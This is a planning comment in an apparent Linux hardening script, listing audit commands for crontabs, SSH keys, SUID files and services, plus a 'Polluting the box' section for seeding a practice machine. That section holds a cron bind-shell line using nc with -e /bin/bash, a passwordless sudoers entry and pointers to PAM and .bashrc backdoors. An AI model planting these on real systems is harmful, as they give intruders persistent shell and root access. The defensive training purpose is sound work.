#!/bin/bash

: '
 TODO:
 - Finds vulnerabilities
 - File permissions
 - User verification (sudoers file, etc password)
 - Unknown files (scripts on machine)
 - Unknown services (diff normal services)
 - Make necessary changes
 - Fix file permissions to specified policy (maybe theres something on the ubuntu website for standardized permissions)
 - Find all logged in users
 - Change /etc/sudoers file
 - systemctl stop and delete services (systemctl cat to find more info)
 - Find crontabs for all users and determine if they are malicious (find a way to decipher)

--------------------------------------------------------------
Useful Commands for script:
Finding contabs:
	for user in $(cut -f1 -d: /etc/passwd); do echo "user: $user"; crontab -u "$user" -l 2>/dev/null && echo ""; done

Finding authorized_keys:
	sudo find / -name authorized_keys 2>/dev/null

Service Magagement:
	systemctl status <service>
	systemctl cat <service>
	systemctl restart <service>
	systemctl enable --now <service>
	systemctl disable <service>
	systemctl stop <service>

Finding files with SUID Bit:
	sudo find / -perm -u=s 2>/dev/null

Finding Shell Scripts:
	sudo find / -type f -iname *.sh 2>/dev/null

Audit .bashrc
	not sure how to be doing this just yet, maybe grep for some common words

Audit /etc/pam.d/
	grep for some known malicious code

--------------------------------------------------------------
Polluting the box:

Reverse shell in crontab:
	* * * * * ss -ln|grep -q :4444 || /usr/bin/nc -lvp 4444 -e /bin/bash >> /dev/null 2>> /dev/null &

PAM backdoor to record passwords:
	https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/

Sudoers miconfiguration:
	allow root to have all perms with no password - root ALL ALL=(ALL) NOPASSWD: ALL

Have another user logged in somehow?
	set up account with home directory, shell, etc.

Files with SUID bit set
	tar, bash, chmod, cowsay, etc.

Scripts on machine not made by current user:
	shell scripts on different locations

Bash RC malicious code injection
	sshrc or rc file on system and executed whenever a new session is created

--------------------------------------------------------------
Flow:
1. set necessary globals
2. make sure to have control for necessary usage of script and any flags that the user can set
3. have all output also go to an ouput file for the user to review afterwards
4. check what os we are on
5. have logging commands to terminal with COLOR to show which part of the script we are on

'
